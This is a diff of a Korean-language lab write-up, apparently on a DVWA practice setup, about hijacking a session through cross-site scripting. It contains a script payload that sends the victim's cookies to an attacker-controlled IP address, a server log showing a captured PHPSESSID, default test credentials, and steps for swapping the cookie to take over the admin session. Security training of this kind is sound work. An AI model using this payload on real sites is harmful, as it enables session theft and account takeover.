@@ -13,9 +13,9 @@
 <script>document.location='http://192.168.60.128/cookie?'+document.cookie</script>
 ```
 3. 윈도우에서 `404 Not Found` 가 보임과 동시에 칼리에서는 쿠키 정보로써 세션을 탈취한 아래 내용이 보임
-``` wrap
+<pre>
 192.168.60.1 - - [09/Apr/2021:17:18:51 +0900] "GET /cookie?security=low;%20PHPSESSID=48b916e85b42330e04852ff049d5f064 HTTP/1.1" 404 188 "http://192.168.60.129/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
-```
+</pre>
 4. 칼리에서 DVWA에 `pablo:letmein` 또는 `smithy:password` 로 로그인
 5. Cookie Editor 에서 `PHPSESSID` 를 로그 파일의 내용으로 변경
 6. 새로고침 하면 왼쪽 아래에 Username 이 admin 으로 된 것을 볼 수 있음
